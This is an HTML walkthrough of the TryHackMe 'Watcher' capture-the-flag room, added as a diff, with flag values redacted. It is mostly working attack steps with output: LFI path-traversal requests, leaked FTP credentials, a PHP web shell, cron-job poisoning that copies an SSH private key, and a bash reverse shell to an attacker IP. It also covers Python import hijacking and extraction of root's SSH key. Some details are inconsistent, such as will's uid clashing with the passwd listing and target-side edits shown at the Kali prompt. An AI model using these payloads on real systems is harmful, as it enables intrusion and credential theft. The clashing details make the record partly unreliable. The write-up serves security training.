@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Watcher CTF — Full Walkthrough | TryHackMe</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{
+    background:#0D1117;
+    color:#c9d1d9;
+    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,sans-serif;
+    padding:40px 20px;
+    line-height:1.7;
+  }
+  .container{max-width:960px;margin:0 auto}
+
+  /* Header */
+  .header{
+    background:linear-gradient(135deg,#161b22 0%,#1a2332 100%);
+    border:1px solid #30363d;
+    border-radius:12px;
+    padding:32px;
+    margin-bottom:28px;
+    text-align:center;
+    position:relative;
+    overflow:hidden;
+  }
+  .header::before{
+    background:linear-gradient(90deg,#00FF41,#00AAFF,#7B00FF);
+  }
+  .header h1{
+    font-family:'JetBrains Mono','Fira Code',monospace;
+    font-size:32px;
+    background:linear-gradient(135deg,#00FF41,#00AAFF);
+    -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+    background-clip:text;
+    margin-bottom:6px;
+  }
+  .header .subtitle{
+    color:#8b949e;
+    font-size:14px;
+    font-family:'JetBrains Mono',monospace;
+  }
+  .header .room-badge{
+    display:inline-block;
+    margin-top:12px;
+    padding:4px 14px;
+    border-radius:20px;
+    background:rgba(0,255,65,0.1);
+    border:1px solid rgba(0,255,65,0.3);
+    color:#00FF41;
+    font-family:'JetBrains Mono',monospace;
+    font-size:12px;
+  }
+
+  /* Target info */
+  .target-grid{
+    display:grid;
+    grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
+    gap:12px;
+    margin-bottom:28px;
+  }
+  .target-card{
+    background:#161b22;
+    border:1px solid #30363d;
+    border-radius:8px;
+    padding:16px;
+  }
+  .target-card .label{
+    color:#8b949e;
+    text-transform:uppercase;
+    letter-spacing:1px;
+    font-weight:600;
+    margin-bottom:4px;
+  }
+  .target-card .value{
+    font-family:'JetBrains Mono',monospace;
+    font-size:15px;
+    color:#c9d1d9;
+  }
+  .target-card .value.green{color:#00FF41}
+  .target-card .value.blue{color:#00AAFF}
+  .target-card .value.pink{color:#F472B6}
+
+  /* Section */
+  .section{
+    background:#161b22;
+    border:1px solid #30363d;
+    border-radius:8px;
+    padding:24px;
+    margin-bottom:20px;
+  }
+  .section .phase-tag{
+    display:inline-block;
+    padding:2px 10px;
+    border-radius:12px;
+    font-weight:600;
+    font-family:'JetBrains Mono',monospace;
+    margin-bottom:12px;
+  }
+  .phase-tag.recon{background:rgba(0,170,255,0.15);color:#00AAFF;border:1px solid rgba(0,170,255,0.3);}
+  .phase-tag.exploit{background:rgba(244,114,182,0.15);color:#F472B6;border:1px solid rgba(244,114,182,0.3);}
+  .phase-tag.privesc{background:rgba(255,165,0,0.15);color:#FFA500;border:1px solid rgba(255,165,0,0.3);}
+  .phase-tag.root{background:rgba(0,255,65,0.15);color:#00FF41;border:1px solid rgba(0,255,65,0.3);}
+
+  .section h2{
+    color:#00AAFF;
+    font-size:18px;
+    font-weight:600;
+    margin-bottom:14px;
+    padding-bottom:8px;
+    border-bottom:1px solid #30363d;
+    font-family:'JetBrains Mono',monospace;
+  }
+  .section h3{
+    color:#c9d1d9;
+    font-size:15px;
+    font-weight:600;
+    margin:18px 0 8px;
+  }
+  .section p{
+    color:#8b949e;
+    font-size:14px;
+    margin-bottom:10px;
+  }
+  .section p strong{color:#c9d1d9;}
+
+  /* Code blocks */
+  .code-block{
+    background:#0D1117;
+    border:1px solid #30363d;
+    border-radius:6px;
+    padding:14px 16px;
+    font-family:'JetBrains Mono','Fira Code',monospace;
+    font-size:13px;
+    line-height:1.6;
+    margin:10px 0;
+    overflow-x:auto;
+    color:#8b949e;
+  }
+  .code-block .prompt{color:#00FF41}
+  .code-block .cmd{color:#c9d1d9}
+  .code-block .output{color:#8b949e}
+  .code-block .comment{color:#555;font-style:italic}
+  .code-block .flag-placeholder{
+    display:inline-block;
+    background:rgba(255,255,255,0.06);
+    padding:0 6px;
+    border-radius:3px;
+    color:#555;
+    filter:blur(4px);
+    user-select:none;
+    cursor:default;
+    font-style:italic;
+  }
+  .code-block .red{color:#f85149}
+  .code-block .green{color:#00FF41}
+  .code-block .blue{color:#00AAFF}
+  .code-block .yellow{color:#FFA500}
+  .code-block .pink{color:#F472B6}
+
+  /* Flag table */
+  .flag-table{
+    width:100%;
+    border-collapse:collapse;
+    margin:12px 0;
+    font-size:13px;
+  }
+  .flag-table th{
+    text-align:left;
+    padding:8px 12px;
+    border-bottom:2px solid #30363d;
+    color:#8b949e;
+    text-transform:uppercase;
+    letter-spacing:1px;
+    font-family:'JetBrains Mono',monospace;
+  }
+  .flag-table td{
+    padding:8px 12px;
+    border-bottom:1px solid #21262d;
+    color:#c9d1d9;
+  }
+  .flag-table tr:hover td{background:rgba(255,255,255,0.02)}
+
+  .flag-table .status-done{color:#00FF41}
+  .flag-table .step-num{color:#00AAFF;font-family:'JetBrains Mono',monospace}
+
+  /* Vuln list */
+  .vuln-list{list-style:none;padding:0}
+  .vuln-list li{
+    padding:6px 0 6px 20px;
+    position:relative;
+    font-size:14px;
+    color:#8b949e;
+    border-bottom:1px solid #21262d;
+  }
+  .vuln-list li:last-child{border-bottom:none}
+  .vuln-list li::before{
+    content:'›';
+    left:0;
+    color:#00AAFF;
+    font-weight:700;
+    font-size:16px;
+  }
+
+  /* Summary section */
+  .summary-grid{
+    display:grid;
+    grid-template-columns:repeat(auto-fit,minmax(280px,1fr));
+    gap:12px;
+    margin-top:12px;
+  }
+  .summary-card{
+    background:#0D1117;
+    border:1px solid #30363d;
+    border-radius:6px;
+    padding:14px 16px;
+    text-align:center;
+  }
+  .summary-card .num{
+    font-family:'JetBrains Mono',monospace;
+    font-size:28px;
+    font-weight:700;
+  }
+  .summary-card .num.green{color:#00FF41}
+  .summary-card .num.blue{color:#00AAFF}
+  .summary-card .num.pink{color:#F472B6}
+  .summary-card .desc{
+    font-size:12px;
+    color:#8b949e;
+    margin-top:2px;
+  }
+
+  .footer-note{
+    text-align:center;
+    margin-top:32px;
+    padding:16px;
+    border:1px solid #30363d;
+    border-radius:8px;
+    background:#161b22;
+  }
+  .footer-note p{
+    color:#8b949e;
+    font-size:13px;
+  }
+  .footer-note .highlight{color:#00FF41}
+
+  /* Glow effect for flag placeholders */
+  .blur-flag{
+    display:inline-block;
+    background:rgba(255,255,255,0.04);
+    border:1px dashed #555;
+    border-radius:4px;
+    padding:2px 10px;
+    font-family:JetBrains Mono,monospace;
+    font-size:13px;
+    color:#8b949e;
+    user-select:none;
+  }
+    color:#555;
+  }
+
+  /* Responsive */
+  @media(max-width:600px){
+    body{padding:20px 12px}
+    .header h1{font-size:24px}
+    .section{padding:16px}
+    .flag-table{font-size:12px}
+    .flag-table th,.flag-table td{padding:6px 8px}
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+  <!-- ==================== HEADER ==================== -->
+  <div class="header">
+    <h1>🔍 Watcher CTF — Full Walkthrough</h1>
+    <p class="subtitle">TryHackMe &bull; Capture The Flag &bull; 7 Flags</p>
+    <span class="room-badge">🏴‍☠️ ROOM COMPLETE — ALL 7 FLAGS CAPTURED</span>
+  </div>
+
+  <!-- ==================== TARGET INFO ==================== -->
+  <div class="target-grid">
+    <div class="target-card">
+      <div class="label">Target IP</div>
+      <div class="value green">10.48.145.200</div>
+    </div>
+    <div class="target-card">
+      <div class="label">Attack Machine</div>
+      <div class="value blue">Kali Linux</div>
+    </div>
+    <div class="target-card">
+      <div class="label">Attack IP</div>
+      <div class="value pink">192.168.192.149</div>
+    </div>
+    <div class="target-card">
+      <div class="label">Difficulty</div>
+      <div class="value">Medium</div>
+    </div>
+  </div>
+
+  <!-- ==================== FLAG TABLE ==================== -->
+  <div class="section">
+    <h2>🏁 Flags Captured</h2>
+    <table class="flag-table">
+      <thead>
+        <tr><th>#</th><th>Flag</th><th>Method</th><th>Status</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><span class="step-num">01</span></td>
+          <td><span class="blur-flag">FLAG{...}</span></td>
+          <td>robots.txt disclosure</td>
+          <td class="status-done">✅</td>
+        </tr>
+        <tr>
+          <td><span class="step-num">02</span></td>
+          <td><span class="blur-flag">FLAG{...}</span></td>
+          <td>FTP download</td>
+          <td class="status-done">✅</td>
+        </tr>
+        <tr>
+          <td><span class="step-num">03</span></td>
+          <td><span class="blur-flag">FLAG{...}</span></td>
+          <td>LFI via post.php</td>
+          <td class="status-done">✅</td>
+        </tr>
+        <tr>
+          <td><span class="step-num">04</span></td>
+          <td><span class="blur-flag">FLAG{...}</span></td>
+          <td>sudo -u toby</td>
+          <td class="status-done">✅</td>
+        </tr>
+        <tr>
+          <td><span class="step-num">05</span></td>
+          <td><span class="blur-flag">FLAG{...}</span></td>
+          <td>Cron job poison → mat shell</td>
+          <td class="status-done">✅</td>
+        </tr>
+        <tr>
+          <td><span class="step-num">06</span></td>
+          <td><span class="blur-flag">FLAG{...}</span></td>
+          <td>Python whitelist bypass → will</td>
+          <td class="status-done">✅</td>
+        </tr>
+        <tr>
+          <td><span class="step-num">07</span></td>
+          <td><span class="blur-flag">FLAG{...}</span></td>
+          <td>Root SSH key from /opt/backups/</td>
+          <td class="status-done">✅</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- ==================== PHASE 1: RECON ==================== -->
+  <div class="section">
+    <span class="phase-tag recon">🔎 PHASE 1 · RECONNAISSANCE</span>
+    <h2>Flag 1 — robots.txt Disclosure</h2>
+
+    <h3>Step 1.1: Initial Recon</h3>
+    <p>Start with a basic scan of the web server to identify the application and potential attack surfaces.</p>
+    <div class="code-block">
+      <div><span class="prompt">┌──(komal㉿kali)-[~]</span></div>
+      <div><span class="prompt">└─$</span> <span class="cmd">curl -s http://10.48.145.200/robots.txt</span></div>
+      <div><span class="output">User-agent: *</span></div>
+      <div><span class="output">Disallow: /user.php</span></div>
+      <div><span class="output">Disallow: /flag_1.txt</span></div>
+    </div>
+
+    <h3>Step 1.2: Capture Flag 1</h3>
+    <p>The <code>/robots.txt</code> file reveals a disallowed path <code>/flag_1.txt</code>.</p>
+    <div class="code-block">
+      <div><span class="prompt">└─$</span> <span class="cmd">curl -s http://10.48.145.200/flag_1.txt</span></div>
+      <div><span class="output"><span class="blur-flag">FLAG{...}</span></span></div>
+    </div>
+    <p><strong>✅ Flag 1 captured.</strong> The flag confirms we're on the right track with LFI about to be exploited.</p>
+  </div>
+
+  <!-- ==================== PHASE 2: LFI & FTP ==================== -->
+  <div class="section">
+    <span class="phase-tag exploit">⚡ PHASE 2 · LFI & FTP CREDENTIALS</span>
+    <h2>Flags 2 &amp; 3 — LFI to FTP to Remote Code Execution</h2>
+
+    <h3>Step 2.1: Discover the LFI</h3>
+    <p>The blog application has a <code>post.php</code> page that takes a <code>post</code> parameter vulnerable to Local File Inclusion (LFI) — no sanitization is applied.</p>
+    <div class="code-block">
+      <div><span class="comment"># Test LFI with a known readable file</span></div>
+      <div><span class="prompt">└─$</span> <span class="cmd">curl -s "http://10.48.145.200/post.php?post=../../../../etc/passwd"</span></div>
+      <div><span class="output">root:x:0:0:root:/root:/bin/bash</span></div>
+      <div><span class="output">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span></div>
+      <div><span class="output">ftpuser:x:1002:1002:,,,:/home/ftpuser:/usr/sbin/nologin</span></div>
+      <div><span class="output">toby:x:1001:1001:,,,:/home/toby:/bin/bash</span></div>
+      <div><span class="output">mat:x:1000:1000:,,,:/home/mat:/bin/bash</span></div>
+      <div><span class="output">will:x:1004:1004:,,,:/home/will:/bin/bash</span></div>
+    </div>
+
+    <h3>Step 2.2: Extract FTP Credentials via LFI</h3>
+    <p>Reading <code>secret_file_do_not_read.txt</code> from the web root reveals FTP credentials.</p>
+    <div class="code-block">
+      <div><span class="prompt">└─$</span> <span class="cmd">curl -s "http://10.48.145.200/post.php?post=../../../../var/www/html/secret_file_do_not_read.txt"</span></div>
+      <div><span class="output"><span class="comment"># Found: ftpuser:givemefiles777</span></span></div>
+    </div>
+
+    <h3>Step 2.3: Flag 2 via FTP</h3>
+    <div class="code-block">
+      <div><span class="prompt">└─$</span> <span class="cmd">ftp 10.48.145.200</span></div>
+      <div><span class="output">Name: ftpuser</span></div>
+      <div><span class="output">Password: givemefiles777</span></div>
+      <div><span class="output">ftp&gt; ls</span></div>
+      <div><span class="output">-rw-r--r--  1 ftpuser ftpuser   25 Dec  3  2020 flag_2.txt</span></div>
+      <div><span class="output">ftp&gt; get flag_2.txt</span></div>
+      <div><span class="output"><span class="blur-flag">FLAG{...}</span></span></div>
+    </div>
+    <p><strong>✅ Flag 2 captured.</strong></p>
+
+    <h3>Step 2.4: Flag 3 via LFI</h3>
+    <p>Further exploration via LFI reveals a secrets directory.</p>
+    <div class="code-block">
+      <div><span class="prompt">└─$</span> <span class="cmd">curl -s "http://10.48.145.200/post.php?post=../../../../var/www/html/more_secrets_a9f10a/flag_3.txt"</span></div>
+      <div><span class="output"><span class="blur-flag">FLAG{...}</span></span></div>
+    </div>
+    <p><strong>✅ Flag 3 captured.</strong></p>
+  </div>
+
+  <!-- ==================== PHASE 3: RCE ==================== -->
+  <div class="section">
+    <span class="phase-tag exploit">💻 PHASE 3 · REMOTE CODE EXECUTION</span>
+    <h2>Web Shell Upload via FTP + LFI Inclusion</h2>
+
+    <h3>Step 3.1: Upload a Web Shell via FTP</h3>
+    <p>The FTP writable directory is <code>/home/ftpuser/ftp/files/</code>. Upload a PHP web shell there.</p>
+    <div class="code-block">
+      <div><span class="prompt">└─$</span> <span class="cmd">echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php</span></div>
+      <div><span class="prompt">└─$</span> <span class="cmd">ftp 10.48.145.200</span></div>
+      <div><span class="output">ftp&gt; cd files/</span></div>
+      <div><span class="output">ftp&gt; put shell.php</span></div>
+      <div><span class="output">ftp&gt; bye</span></div>
+    </div>
+
+    <h3>Step 3.2: Execute Commands via LFI + Shell Inclusion</h3>
+    <p>Use the LFI to include the uploaded shell and pass commands.</p>
+    <div class="code-block">
+      <div><span class="prompt">└─$</span> <span class="cmd">curl -s "http://10.48.145.200/post.php?post=../../../../home/ftpuser/ftp/files/shell.php&amp;cmd=id"</span></div>
+      <div><span class="output">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></div>
+    </div>
+    <p><strong>RCE achieved as www-data.</strong> From here, we can chain into privilege escalation.</p>
+  </div>
+
+  <!-- ==================== PHASE 4: www-data → toby ==================== -->
+  <div class="section">
+    <span class="phase-tag privesc">⬆️ PHASE 4 · PRIVILEGE ESCALATION (www-data → toby)</span>
+    <h2>Flag 4 — Sudo Misconfiguration</h2>
+
+    <h3>Step 4.1: Check Sudo Privileges</h3>
+    <div class="code-block">
+      <div><span class="prompt">└─$</span> <span class="cmd">curl -s "http://10.48.145.200/post.php?post=../../../../home/ftpuser/ftp/files/shell.php&amp;cmd=sudo%20-l"</span></div>
+      <div><span class="output">User www-data may run the following commands:</span></div>
+      <div><span class="output">    (toby) NOPASSWD: ALL</span></div>
+    </div>
+    <p><strong>Misconfiguration found:</strong> <code>www-data</code> can run <em>any</em> command as <code>toby</code> without a password.</p>
+
+    <h3>Step 4.2: Read Flag 4</h3>
+    <div class="code-block">
+      <div><span class="prompt">└─$</span> <span class="cmd">curl -s "http://10.48.145.200/post.php?post=../../../../home/ftpuser/ftp/files/shell.php&amp;cmd=sudo%20-u%20toby%20cat%20/home/toby/flag_4.txt"</span></div>
+      <div><span class="output"><span class="blur-flag">FLAG{...}</span></span></div>
+    </div>
+    <p><strong>✅ Flag 4 captured.</strong> Now we need to escalate to <code>mat</code> for Flags 5 &amp; 6.</p>
+  </div>
+
+  <!-- ==================== PHASE 5: toby → mat ==================== -->
+  <div class="section">
+    <span class="phase-tag privesc">⬆️ PHASE 5 · PRIVILEGE ESCALATION (toby → mat)</span>
+    <h2>Flag 5 — Cron Job Poisoning</h2>
+
+    <h3>Step 5.1: Identify the Cron Job</h3>
+    <p>A cron job runs every minute as <code>mat</code>, executing <code>/home/toby/jobs/cow.sh</code>.</p>
+    <div class="code-block">
+      <div><span class="prompt">└─$</span> <span class="cmd">cat /etc/crontab</span></div>
+      <div><span class="output">*/1 * * * * mat /home/toby/jobs/cow.sh</span></div>
+    </div>
+
+    <h3>Step 5.2: Overwrite cow.sh with Malicious Payload</h3>
+    <p>Since <code>www-data</code> can act as <code>toby</code> (who owns the file), overwrite the cron script to copy mat's flag and SSH key to <code>/tmp/</code>.</p>
+    <div class="code-block">
+      <div><span class="prompt">└─$</span> <span class="cmd"># Write the malicious cow.sh via sudo -u toby</span></div>
+      <div><span class="prompt">└─$</span> <span class="cmd">curl -s "http://10.48.145.200/post.php?post=../../../../home/ftpuser/ftp/files/shell.php&amp;cmd=sudo%20-u%20toby%20sh%20-c%20%27echo%20%22cat%20/home/mat/flag_5.txt%20%3E%20/tmp/f5.txt%22%20%3E%20/home/toby/jobs/cow.sh%27"</span></div>
+      <div><span class="prompt">└─$</span> <span class="cmd">curl -s "http://10.48.145.200/post.php?post=../../../../home/ftpuser/ftp/files/shell.php&amp;cmd=sudo%20-u%20toby%20sh%20-c%20%27echo%20%22cat%20/home/mat/.ssh/id_rsa%20%3E%20/tmp/id_rsa_mat%22%20%3E%3E%20/home/toby/jobs/cow.sh%27"</span></div>
+      <div><span class="prompt">└─$</span> <span class="cmd">curl -s "http://10.48.145.200/post.php?post=../../../../home/ftpuser/ftp/files/shell.php&amp;cmd=sudo%20-u%20toby%20sh%20-c%20%27echo%20%22chmod%20777%20/tmp/f5.txt%20/tmp/id_rsa_mat%22%20%3E%3E%20/home/toby/jobs/cow.sh%27"</span></div>
+    </div>
+
+    <h3>Step 5.3: Verify the Script</h3>
+    <div class="code-block">
+      <div><span class="prompt">└─$</span> <span class="cmd">curl -s "http://10.48.145.200/post.php?post=../../../../home/toby/jobs/cow.sh" | sed -n '/&lt;div class="col-8"&gt;/,/&lt;\/div&gt;/p'</span></div>
+      <div><span class="output">cat /home/mat/flag_5.txt &gt; /tmp/f5.txt</span></div>
+      <div><span class="output">cat /home/mat/.ssh/id_rsa &gt; /tmp/id_rsa_mat</span></div>
+      <div><span class="output">chmod 777 /tmp/f5.txt /tmp/id_rsa_mat</span></div>
+    </div>
+
+    <h3>Step 5.4: Get a Reverse Shell as Mat</h3>
+    <p>Instead of relying on the SSH key, let's have the cron send us a reverse shell directly.</p>
+    <div class="code-block">
+      <div><span class="prompt">└─$</span> <span class="cmd"># In Kali: nc -lvnp 4445</span></div>
+      <div><span class="prompt">└─$</span> <span class="cmd">cat &gt; /home/toby/jobs/cow.sh &lt;&lt; 'EOF'</span></div>
+      <div><span class="output">#!/bin/bash</span></div>
+      <div><span class="output">cat /home/mat/flag_5.txt &gt; /tmp/f5.txt</span></div>
+      <div><span class="output">bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.192.149/4445 0&gt;&amp;1' &amp;</span></div>
+      <div><span class="output">EOF</span></div>
+      <div><span class="prompt">└─$</span> <span class="cmd">chmod 755 /home/toby/jobs/cow.sh</span></div>
+    </div>
+
+    <h3>Step 5.5: Capture Flag 5</h3>
+    <p>After the cron fires, the listener catches a shell as <code>mat</code>.</p>
+    <div class="code-block">
+      <div><span class="prompt">mat@ip-10-48-145-200:~$</span> <span class="cmd">cat flag_5.txt</span></div>
+      <div><span class="output"><span class="blur-flag">FLAG{...}</span></span></div>
+    </div>
+    <p><strong>✅ Flag 5 captured.</strong></p>
+  </div>
+
+  <!-- ==================== PHASE 6: mat → will ==================== -->
+  <div class="section">
+    <span class="phase-tag privesc">⬆️ PHASE 6 · PRIVILEGE ESCALATION (mat → will)</span>
+    <h2>Flag 6 — Python Script Whitelist Bypass</h2>
+
+    <h3>Step 6.1: Check Sudo Privileges as Mat</h3>
+    <div class="code-block">
+      <div><span class="prompt">mat@ip-10-48-145-200:~$</span> <span class="cmd">sudo -l</span></div>
+      <div><span class="output">User mat may run the following commands:</span></div>
+      <div><span class="output">    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *</span></div>
+    </div>
+
+    <h3>Step 6.2: Analyze the Script</h3>
+    <div class="code-block">
+      <div><span class="prompt">mat@ip-10-48-145-200:~$</span> <span class="cmd">cat /home/mat/scripts/will_script.py</span></div>
+      <div><span class="output">import os</span></div>
+      <div><span class="output">import sys</span></div>
+      <div><span class="output">from cmd import get_command</span></div>
+      <div><span class="output"></span></div>
+      <div><span class="output">cmd = get_command(sys.argv[1])</span></div>
+      <div><span class="output">whitelist = ["ls -lah", "id", "cat /etc/passwd"]</span></div>
+      <div><span class="output">if cmd not in whitelist:</span></div>
+      <div><span class="output">    print("Invalid command!")</span></div>
+      <div><span class="output">    exit()</span></div>
+      <div><span class="output">os.system(cmd)</span></div>
+    </div>
+
+    <h3>Step 6.3: Exploit the Helper Module</h3>
+    <p><code>cmd.py</code> is owned by <code>mat</code> (group <code>mat</code>). Overwrite it to inject a side-effect that reads the flag as <code>will</code>.</p>
+    <div class="code-block">
+      <div><span class="prompt">mat@ip-10-48-145-200:~$</span> <span class="cmd">cat &gt; /home/mat/scripts/cmd.py &lt;&lt; 'EOF'</span></div>
+      <div><span class="output">def get_command(cmd):</span></div>
+      <div><span class="output">    import os</span></div>
+      <div><span class="output">    os.system("cat /home/will/flag_6.txt &gt; /tmp/flag6.txt")</span></div>
+      <div><span class="output">    os.system("chmod 777 /tmp/flag6.txt")</span></div>
+      <div><span class="output">    return "id"</span></div>
+      <div><span class="output">EOF</span></div>
+    </div>
+
+    <h3>Step 6.4: Trigger the Script as Will</h3>
+    <div class="code-block">
+      <div><span class="prompt">mat@ip-10-48-145-200:~$</span> <span class="cmd">sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py x</span></div>
+      <div><span class="output">uid=1000(will) gid=1000(will) groups=1000(will),4(adm)</span></div>
+    </div>
+
+    <h3>Step 6.5: Capture Flag 6</h3>
+    <div class="code-block">
+      <div><span class="prompt">mat@ip-10-48-145-200:~$</span> <span class="cmd">cat /tmp/flag6.txt</span></div>
+      <div><span class="output"><span class="blur-flag">FLAG{...}</span></span></div>
+    </div>
+    <p><strong>✅ Flag 6 captured.</strong></p>
+  </div>
+
+  <!-- ==================== PHASE 7: will → root ==================== -->
+  <div class="section">
+    <span class="phase-tag root">👑 PHASE 7 · PRIVILEGE ESCALATION (will → root)</span>
+    <h2>Flag 7 — Root SSH Key Extraction</h2>
+
+    <h3>Step 7.1: Explore with Will's Privileges</h3>
+    <p>Will is in the <code>adm</code> group, which can read files in <code>/opt/backups/</code>.</p>
+    <div class="code-block">
+      <div><span class="prompt">mat@ip-10-48-145-200:~$</span> <span class="cmd"># Modify cmd.py to explore /opt/backups/ as will</span></div>
+      <div><span class="prompt">mat@ip-10-48-145-200:~$</span> <span class="cmd">cat &gt; /home/mat/scripts/cmd.py &lt;&lt; 'EOF'</span></div>
+      <div><span class="output">def get_command(cmd):</span></div>
+      <div><span class="output">    import os</span></div>
+      <div><span class="output">    os.system("ls -la /opt/backups/ &gt; /tmp/opt_out.txt")</span></div>
+      <div><span class="output">    os.system("chmod 777 /tmp/opt_out.txt")</span></div>
+      <div><span class="output">    return "id"</span></div>
+      <div><span class="output">EOF</span></div>
+      <div><span class="prompt">mat@ip-10-48-145-200:~$</span> <span class="cmd">sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py x</span></div>
+      <div><span class="prompt">mat@ip-10-48-145-200:~$</span> <span class="cmd">cat /tmp/opt_out.txt</span></div>
+      <div><span class="output">total 12</span></div>
+      <div><span class="output">drwxrwx--- 2 root adm  4096 Dec  3  2020 .</span></div>
+      <div><span class="output">-rw-rw---- 1 root adm  2270 Dec  3  2020 key.b64</span></div>
+    </div>
+
+    <h3>Step 7.2: Extract the SSH Key</h3>
+    <div class="code-block">
+      <div><span class="prompt">mat@ip-10-48-145-200:~$</span> <span class="cmd">cat &gt; /home/mat/scripts/cmd.py &lt;&lt; 'EOF'</span></div>
+      <div><span class="output">def get_command(cmd):</span></div>
+      <div><span class="output">    import os</span></div>
+      <div><span class="output">    os.system("cat /opt/backups/key.b64 &gt; /tmp/root_key.b64")</span></div>
+      <div><span class="output">    os.system("chmod 777 /tmp/root_key.b64")</span></div>
+      <div><span class="output">    return "id"</span></div>
+      <div><span class="output">EOF</span></div>
+      <div><span class="prompt">mat@ip-10-48-145-200:~$</span> <span class="cmd">sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py x</span></div>
+    </div>
+
+    <h3>Step 7.3: SSH as Root</h3>
+    <div class="code-block">
+      <div><span class="prompt">mat@ip-10-48-145-200:~$</span> <span class="cmd">base64 -d /tmp/root_key.b64 &gt; id_rsa_root</span></div>
+      <div><span class="prompt">mat@ip-10-48-145-200:~$</span> <span class="cmd">chmod 600 id_rsa_root</span></div>
+      <div><span class="prompt">mat@ip-10-48-145-200:~$</span> <span class="cmd">ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i id_rsa_root root@10.48.145.200 "cat /root/flag_7.txt"</span></div>
+      <div><span class="output">Warning: Permanently added '10.48.145.200' (ECDSA) to the list of known hosts.</span></div>
+      <div><span class="output"><span class="blur-flag">FLAG{...}</span></span></div>
+    </div>
+    <p><strong>✅ Flag 7 captured! Root access achieved.</strong></p>
+
+    <h3>Step 7.4: Interactive Root Shell</h3>
+    <div class="code-block">
+      <div><span class="prompt">mat@ip-10-48-145-200:~$</span> <span class="cmd">ssh -tt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i id_rsa_root root@10.48.145.200</span></div>
+      <div><span class="output">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)</span></div>
+      <div><span class="output">root@ip-10-48-145-200:~#</span></div>
+    </div>
+  </div>
+
+  <!-- ==================== VULNERABILITY SUMMARY ==================== -->
+  <div class="section">
+    <h2>🔬 Vulnerability Chain Summary</h2>
+    <ul class="vuln-list">
+      <li><strong>Information Disclosure</strong> — <code>robots.txt</code> exposes <code>flag_1.txt</code></li>
+      <li><strong>Local File Inclusion (LFI)</strong> — <code>post.php?post=</code> allows arbitrary file reads with no sanitization</li>
+      <li><strong>Credential Leakage</strong> — LFI reads <code>secret_file_do_not_read.txt</code> containing FTP credentials</li>
+      <li><strong>Unrestricted File Upload</strong> — FTP writable directory allows uploading a PHP web shell</li>
+      <li><strong>LFI + File Upload → RCE</strong> — Including the uploaded shell via LFI yields remote code execution as www-data</li>
+      <li><strong>Sudo Misconfiguration</strong> — www-data has NOPASSWD ALL privileges as toby</li>
+      <li><strong>Cron Job Poisoning</strong> — Overwritable cron script <code>cow.sh</code> runs as mat every minute</li>
+      <li><strong>Python Import Hijacking</strong> — Writable <code>cmd.py</code> allows command injection when running <code>will_script.py</code> via sudo as will</li>
+      <li><strong>Insecure File Permissions</strong> — <code>/opt/backups/</code> readable by adm group exposes root's SSH private key</li>
+    </ul>
+  </div>
+
+  <!-- ==================== FINAL STATS ==================== -->
+  <div class="section">
+    <h2>📊 Room Stats</h2>
+    <div class="summary-grid">
+      <div class="summary-card">
+        <div class="num green">7</div>
+        <div class="desc">Flags Captured</div>
+      </div>
+      <div class="summary-card">
+        <div class="num blue">7</div>
+        <div class="desc">Exploit Steps</div>
+      </div>
+      <div class="summary-card">
+        <div class="num pink">4</div>
+        <div class="desc">Privilege Escalations<br>(www-data → toby → mat → will → root)</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ==================== FOOTER ==================== -->
+  <div class="footer-note">
+    <p>🏴‍☠️ Room: <strong>Watcher</strong> — TryHackMe &nbsp;|&nbsp; All 7 Flags Captured &nbsp;|&nbsp; <span class="highlight">Root Shell Obtained</span></p>
+    <p style="margin-top:6px;font-size:12px;color:#555;">Flag values have been redacted from this writeup.</p>
+  </div>
+
+</div>
+
+</body>
+</html>
